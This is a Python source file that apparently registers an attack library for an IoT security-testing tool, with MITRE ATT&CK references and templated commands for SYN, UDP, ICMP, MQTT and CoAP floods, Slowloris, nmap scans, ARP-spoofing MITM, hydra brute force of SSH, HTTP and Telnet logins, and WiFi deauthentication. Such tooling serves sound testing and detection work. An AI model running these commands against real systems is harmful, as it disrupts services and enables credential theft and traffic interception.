from modules.attacks.base import AttackDef, AttackResult
from modules.attacks.plugin_loader import load_plugins as _load_plugins

_PLUGIN_ATTACKS: list[AttackDef] | None = None
_PLUGIN_STATUSES = []

ATTACK_LIBRARY: list[AttackDef] = [
    # ── DoS / Flooding ──────────────────────────────────────
    AttackDef(
        name="syn_flood",
        continuous=True,
        recommended_dur_s=30,
        description="SYN flood",
        mitre_ref="T1498.001",
        tool="hping3",
        category="dos",
        command="hping3 -S --flood -V -p {port} {target}",
    ),
    AttackDef(
        name="dos_http",
        continuous=True,
        recommended_dur_s=60,
        description="HTTP Slowloris",
        mitre_ref="T1499.001",
        tool="slowloris",
        category="dos",
        command="slowloris {target} -p {port} -s 200 -v",
        requires_root=False,
    ),
    AttackDef(
        name="udp_flood",
        continuous=True,
        recommended_dur_s=30,
        description="UDP flood",
        mitre_ref="T1498.001",
        tool="hping3",
        category="dos",
        command="hping3 --udp --flood -V -p {port} {target}",
    ),
    AttackDef(
        name="icmp_flood",
        continuous=True,
        recommended_dur_s=30,
        description="ICMP flood (ping of death)",
        mitre_ref="T1498.001",
        tool="hping3",
        category="dos",
        command="hping3 --icmp --flood -V {target}",
    ),

    # ── Reconnaissance ──────────────────────────────────────
    AttackDef(
        name="port_scan",
        recommended_dur_s=120,
        description="Escaneo de puertos TCP",
        mitre_ref="T1046",
        tool="nmap",
        category="recon",
        command="nmap -sV -T4 -p- {target}",
        requires_root=False,
    ),
    AttackDef(
        name="vuln_scan",
        recommended_dur_s=300,
        description="Escaneo de vulnerabilidades",
        mitre_ref="T1595",
        tool="nmap",
        category="recon",
        command="nmap -sV --script=vuln {target}",
    ),
    AttackDef(
        name="os_detection",
        recommended_dur_s=60,
        description="Detección de sistema operativo",
        mitre_ref="T1592",
        tool="nmap",
        category="recon",
        command="nmap -O -sV {target}",
    ),

    # ── MITM ────────────────────────────────────────────────
    AttackDef(
        name="arp_spoof",
        continuous=True,
        recommended_dur_s=60,
        description="ARP spoofing",
        mitre_ref="T1557.002",
        tool="arpspoof",
        category="mitm",
        command="timeout {duration} arpspoof -i eth0 -t {target} {gateway}",
    ),
    AttackDef(
        name="arp_spoof_ettercap",
        continuous=True,
        recommended_dur_s=60,
        description="MITM con Ettercap",
        mitre_ref="T1557.002",
        tool="ettercap",
        category="mitm",
        command="timeout {duration} ettercap -T -q -M arp:remote /{target}// /{gateway}//",
    ),

    # ── Brute Force ─────────────────────────────────────────
    AttackDef(
        name="brute_ssh",
        recommended_dur_s=120,
        description="Fuerza bruta SSH",
        mitre_ref="T1110.001",
        tool="hydra",
        category="brute_force",
        command="hydra -l admin -P /usr/share/wordlists/rockyou.txt {target} ssh -t 4 -V",
        requires_root=False,
    ),
    AttackDef(
        name="brute_http",
        recommended_dur_s=120,
        description="Fuerza bruta HTTP login",
        mitre_ref="T1110.001",
        tool="hydra",
        category="brute_force",
        command='hydra -l admin -P /usr/share/wordlists/rockyou.txt {target} http-get / -t 4 -V',
        requires_root=False,
    ),
    AttackDef(
        name="brute_telnet",
        recommended_dur_s=120,
        description="Fuerza bruta Telnet",
        mitre_ref="T1110.001",
        tool="hydra",
        category="brute_force",
        command="hydra -l admin -P /usr/share/wordlists/rockyou.txt {target} telnet -t 4 -V",
        requires_root=False,
    ),

    # ── IoT Specific ────────────────────────────────────────
    AttackDef(
        name="mqtt_flood",
        continuous=True,
        recommended_dur_s=30,
        description="MQTT flood",
        mitre_ref="T1498",
        tool="mosquitto_pub",
        category="dos",
        command='for i in $(seq 1 10000); do mosquitto_pub -h {target} -t "test/flood" -m "payload_$i" -q 0; done',
        requires_root=False,
    ),
    AttackDef(
        name="tcp_flood",
        continuous=True,
        recommended_dur_s=30,
        description="TCP flood",
        mitre_ref="T1498.001",
        tool="hping3",
        category="dos",
        command="hping3 --flood -p {port} {target}",
    ),
    AttackDef(
        name="ping_flood",
        continuous=True,
        recommended_dur_s=30,
        description="Ping flood",
        mitre_ref="T1498.001",
        tool="nping",
        category="dos",
        command="nping --icmp --rate 1000 -c 10000 {target}",
    ),
    AttackDef(
        name="coap_flood",
        continuous=True,
        recommended_dur_s=30,
        description="CoAP flood",
        mitre_ref="T1498",
        tool="coap-client",
        category="dos",
        command=(
            "COAP=$(command -v coap-client || command -v coap-client-openssl"
            " || command -v coap-client-gnutls || echo coap-client);"
            " for i in $(seq 1 5000); do $COAP -m get coap://{target}/.well-known/core; done"
        ),
        requires_root=False,
    ),
    AttackDef(
        name="deauth_wifi",
        continuous=True,
        recommended_dur_s=30,
        description="WiFi deauthentication",
        mitre_ref="T1498",
        tool="aireplay-ng",
        category="dos",
        command="timeout {duration} aireplay-ng --deauth 0 -a {gateway} -c {target} wlan0mon",
    ),
]


# ── Registry access ─────────────────────────────────────────────

_ATTACK_MAP: dict[str, AttackDef] = {a.name: a for a in ATTACK_LIBRARY}


def get_attack_names() -> list[str]:
    return [a.name for a in ATTACK_LIBRARY]


def get_attack_class(name: str) -> AttackDef | None:
    return _ATTACK_MAP.get(name)


def get_attacks_by_category(category: str) -> list[AttackDef]:
    return [a for a in ATTACK_LIBRARY if a.category == category]


def get_attack_categories() -> list[str]:
    return sorted(set(a.category for a in ATTACK_LIBRARY))


def get_attack_info_list() -> list[dict]:
    """For overlay display — includes native attacks + plugins."""
    result = [
        {"name": a.name, "description": a.description,
         "mitre_ref": a.mitre_ref, "tool": a.tool, "category": a.category}
        for a in ATTACK_LIBRARY
    ]
    # add plugin attacks
    plugins = get_plugin_attacks()
    if plugins:
        for p in plugins:
            result.append({
                "name": p.name, "description": p.description,
                "mitre_ref": p.mitre_ref, "tool": p.tool,
                "category": f"plugin:{p.category}",
            })
    return result

def get_plugin_attacks(auto_install: bool = True, log_callback=None):
    global _PLUGIN_ATTACKS, _PLUGIN_STATUSES
    if _PLUGIN_ATTACKS is None:
        _PLUGIN_ATTACKS, _PLUGIN_STATUSES = _load_plugins(
            auto_install=auto_install,
            log_callback=log_callback
        )
    return _PLUGIN_ATTACKS

def get_plugin_statuses():
    return _PLUGIN_STATUSES

def get_all_attacks() -> list[AttackDef]:
    return ATTACK_LIBRARY + (get_plugin_attacks() or [])